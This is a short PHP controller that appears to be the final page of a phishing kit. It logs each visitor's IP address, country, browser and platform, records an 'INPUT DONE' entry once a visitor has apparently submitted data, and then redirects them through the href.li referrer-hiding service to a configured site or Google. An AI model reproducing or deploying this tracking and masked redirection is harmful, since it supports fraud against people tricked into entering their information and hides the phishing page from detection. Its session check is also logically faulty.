<?php
defined("ALLOW") or exit('No direct script access allowed');

class Finished
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 9)) {
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}

	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/done');
		} else {
			echo view('pc/done');
		}
	}

	public function logout()
	{
		session_destroy();
		if (_config('NOTFOUND') == 'custom') {
			write('Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|INPUT DONE\r\n");
			header("Location: https://href.li/?" . _redirect('Redirect'));
			die;
		} else {
			write('Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|INPUT DONE\r\n");
			header("Location: https://href.li/?https://www.google.com");
			die;
		}
	}
}